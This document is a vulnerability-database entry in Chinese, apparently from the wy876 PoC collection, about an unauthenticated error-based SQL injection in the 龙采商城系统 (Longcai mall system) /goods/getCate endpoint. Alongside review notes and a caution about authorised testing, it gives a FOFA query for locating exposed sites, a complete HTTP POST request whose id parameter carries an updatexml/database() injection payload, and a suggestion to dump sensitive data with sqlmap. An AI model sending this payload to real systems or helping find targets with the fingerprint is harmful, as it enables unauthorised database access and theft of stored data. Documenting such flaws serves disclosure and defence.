---
source: "wy876 漏洞文库"
title: "龙采商城系统 goods/getCate id报错SQL 注入"
product: "龙采商城系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知版本，MySQL UPDATEXML"
prerequisites: "后台功能未授权声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/dyk2it32v9mtbdqw"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%BE%99%E9%87%87%E7%A7%91%E6%8A%80%E9%9B%86%E5%9B%A2%E6%9C%89%E9%99%90%E8%B4%A3%E4%BB%BB%E5%85%AC%E5%8F%B8/%E9%BE%99%E9%87%87%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0_goods_getcate%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md"
fofa: "body=\"'url':'/pc2.0/index/index'\""
fofa_unverified: "body="
id: "vw-935f8e501986e4fb0c49669b"
entity_id: "ve-935f8e501986e4fb0c49669b"
schema_version: "1"
---

# 龙采商城系统 goods/getCate id报错SQL 注入

## 条目说明

- 对象与具体问题：龙采商城系统；goods/getCate id报错SQLi
- 版本、配置及部署条件：未知版本，MySQL UPDATEXML
- 认证与权限前提：后台功能未授权声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 后台是功能位置而非必须登录，需明确术语并给无会话对照
- 只有database()报错请求，无实际响应；敏感数据库内容和大量导出不能由工具说明证明
- Content-Length静态，HTTP/2为工具文本表示不应当线上的原始报文
- 缺产品版本/修复和源码

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

#### 一、漏洞描述
龙采科技集团有限责任公司龙采商城系统后台/goods/getCate接口存在未授权SQL注入，可直接暴露出数据库敏感信息。

#### 二、影响版本
龙采商城系统

#### 三、资产测绘
FOFA：body="'url':'/pc2.0/index/index'"


#### 四、漏洞复现
```http
POST /goods/getCate HTTP/2
Host: xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 65

id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)&keyword=
```

> 请求长度说明：原资料 Content-Length 为 65；保留原始标头；其数值未据实际请求体重新计算或验证。

使用burp请求POC即可暴出敏感数据库（也可以采用sqlmap跑出大量敏感信息）


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dyk2it32v9mtbdqw>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
